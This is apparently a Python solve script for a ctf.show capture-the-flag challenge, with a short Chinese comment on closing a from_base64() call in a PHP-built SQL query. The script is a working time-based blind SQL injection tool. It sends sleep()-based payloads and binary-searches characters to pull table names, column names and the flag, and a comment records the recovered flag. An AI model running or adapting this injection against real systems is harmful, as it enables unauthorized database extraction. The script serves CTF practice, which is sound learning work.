"""
Author : feng
"""
import time
import threading
import requests

'''
查询语句

       where id = from_base64($id);



看到from_base64，想着把payloadbase64加密一次之后再打，但是发现不太行
看了一下y4师傅的姿势，突然醒悟
这个SQL语句是在PHP里的那个$sql，相当于我们传入的payload是拼接到这个PHP的字符串的，
所以根本没必要进行整体的base64加密，因为是字符串的拼接，因此直接闭合from_base64就可以了

'''

url = "http://d64ace5b-1879-4209-aedc-454c1f5aa067.chall.ctf.show:8080/api/index.php"
flag = ''
for i in range(1, 100):
    # lock = threading.Lock()
    min = 32
    max = 128

    while 1:
        # lock.acquire()
        j = min + (max - min) // 2
        if j == min:
            flag += chr(j)
            print(flag)
            if chr(j) == '}':
                exit()
            break
        # payload = "'MQ==') or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))<{},sleep(3),1)#".format(
        # ctfshow_flagxcc,ctfshow_info
        # payload = "'MQ==') or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxcc'),{},1))<{},sleep(3),1)#".format(
        # id,flagaac,info
        payload = "'MQ==') or if(ascii(substr((select group_concat(flagaac) from ctfshow_flagxcc),{},1))<{},sleep(3),1)#".format(
            i, j)
        # ctfshow{359d7a0e-4e8c-464e-9ee6-f0804a7537db}
        data = {
            'ip': payload,
            'debug': 0
        }
        try:
            r = requests.post(url=url, data=data, timeout=2)
            time.sleep(1)
            min = j
        except:
            max = j
        # lock.release()

